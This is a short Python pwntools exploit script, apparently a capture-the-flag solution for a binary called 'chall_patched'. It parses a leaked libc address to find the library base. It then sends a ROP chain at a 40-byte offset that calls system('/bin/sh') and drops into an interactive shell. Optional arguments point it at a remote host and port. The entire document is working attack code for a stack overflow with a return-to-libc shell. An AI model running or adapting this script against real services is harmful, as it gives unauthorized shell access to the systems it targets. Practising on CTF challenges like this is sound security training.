#!/usr/bin/env python3

from IPython.terminal.embed import InteractiveShellEmbed
from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.update(binary=elf, encoding='latin-1')
ipshell = InteractiveShellEmbed()

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process([elf.path])


OFFSET = 40
def main():
    io = start()
    io.recvuntil(" +0x28 | ")
    libc_start_main_leak = int(io.recvn(18), 16)
    success(f"Leaked __libc_start_call_main+128: {hex(libc_start_main_leak)}")
    libc.address = libc_start_main_leak - (libc.sym.__libc_start_call_main + 128)

    rop = ROP(libc)
    rop.call(rop.ret[0])
    rop.system(next(libc.search(b"/bin/sh\0")))
    io.clean()
    io.fit({
        OFFSET: rop.chain()
        })

    io.interactive()


if __name__ == "__main__":
    main()
